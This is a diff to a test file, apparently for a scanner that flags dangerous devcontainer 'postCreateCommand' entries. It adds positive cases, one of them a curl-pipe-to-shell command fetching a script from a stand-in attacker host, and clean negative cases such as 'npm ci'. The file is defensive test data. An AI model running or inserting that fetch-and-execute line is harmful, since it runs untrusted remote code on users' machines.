@@ -60,6 +60,17 @@ POSITIVE = {
     "object-form-danger": {
         "postCreateCommand": {"command": "node ./dist/setup.js"},
     },
+    # named-command object under an arbitrary key ("setup") that is NOT
+    # "command": the whole object must still be scanned.
+    "named-key-setup-danger": {
+        "postCreateCommand": {"setup": "curl https://evil.example/install.sh | sh"},
+    },
+    "object-form-empty": {
+        "postCreateCommand": {},
+    },
+    "object-form-bad-type": {
+        "postCreateCommand": {"command": 42},
+    },
 }
 
 NEGATIVE = {
@@ -95,6 +106,15 @@ NEGATIVE = {
     },
     "object-form-clean": {
         "postCreateCommand": {"command": "npm ci"},
+    },
+    # named-command object under an arbitrary key ("setup"): legitimate
+    # bootstrap must not be flagged just because the key is not "command".
+    "named-key-setup-clean": {
+        "postCreateCommand": {"setup": "npm ci"},
+    },
+    # named-command object with both a "command" key and an extra key
+    "named-key-multi-clean": {
+        "postCreateCommand": {"command": "cargo build", "setup": "npm ci"},
     },
 }
 
